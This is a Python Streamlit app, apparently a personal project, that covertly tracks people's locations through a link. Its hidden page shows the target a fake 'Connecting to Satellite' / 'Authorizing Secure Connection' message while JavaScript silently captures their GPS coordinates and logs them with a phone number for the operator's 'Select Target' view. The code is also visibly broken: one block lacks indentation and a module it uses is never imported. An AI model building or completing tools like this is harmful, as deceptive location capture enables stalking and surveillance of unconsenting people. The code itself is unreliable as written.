import streamlit as st
import pandas as pd
import folium
from streamlit_folium import st_folium
import os
from datetime import datetime

# --- CONFIG ---
st.set_page_config(page_title="Luca's Global Tracker", layout="wide")
LOG_FILE = "location_history.csv"

# Function to save data so it's never lost
def save_location(lat, lon, phone):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    new_data = pd.DataFrame([[timestamp, phone, lat, lon]], 
                            columns=["Time", "Phone", "Lat", "Lon"])
    if not os.path.isfile(LOG_FILE):
        new_data.to_csv(LOG_FILE, index=False)
    else:
        new_data.to_csv(LOG_FILE, mode='a', header=False, index=False)

# --- TRACKING LOGIC ---
st.title("📡 Satellite Tracking & History")

# Check if someone clicked your link (e.g., ?lat=35.8&lon=14.4&phone=99123)
query_params = st.query_params
if "lat" in query_params and "lon" in query_params:
    target_lat = float(query_params["lat"])
    target_lon = float(query_params["lon"])
    target_phone = query_params.get("phone", "Unknown")
    
    # SAVE TO HISTORY IMMEDIATELY
    save_location(target_lat, target_lon, target_phone)
    st.success(f"Signal Locked for {target_phone}!")

# --- THE INTERFACE ---
col1, col2 = st.columns([1, 3])

with col1:
    st.header("📜 Tracking Logs")
    if os.path.exists(LOG_FILE):
        history_df = pd.read_csv(LOG_FILE)
        
        # Filter by phone number if needed
        all_numbers = history_df['Phone'].unique()
        selected_num = st.selectbox("Select Target to View", all_numbers)
        
        filtered_df = history_df[history_df['Phone'] == selected_num]
        st.dataframe(filtered_df.tail(10), use_container_width=True)
        
        if st.button("🗑️ Clear All History"):
            os.remove(LOG_FILE)
            st.rerun()
    else:
        st.info("No tracking history found yet.")

with  col2: 
# --- HIDDEN TRACKING PAGE ---
if "mode" in query_params and query_params["mode"] == "track":
    st.empty() # Clear the screen for the target
    target_phone = query_params.get("phone", "Unknown")
    
    st.write(f"### 📡 Connecting to Satellite for {target_phone}...")
    
    # This JavaScript silently sends the GPS to YOUR map
    components.html(f"""
        <script>
        navigator.geolocation.getCurrentPosition(function(pos) {{
            const lat = pos.coords.latitude;
            const lon = pos.coords.longitude;
            // Redirect back to your main map with the coordinates
            window.location.href = "?phone={target_phone}&lat=" + lat + "&lon=" + lon;
        }});
        </script>
        <p style="text-align:center; color:gray;">Authorizing Secure Connection...</p>
    """, height=200)
    st.stop() # Stop the rest of the app from loading for the target
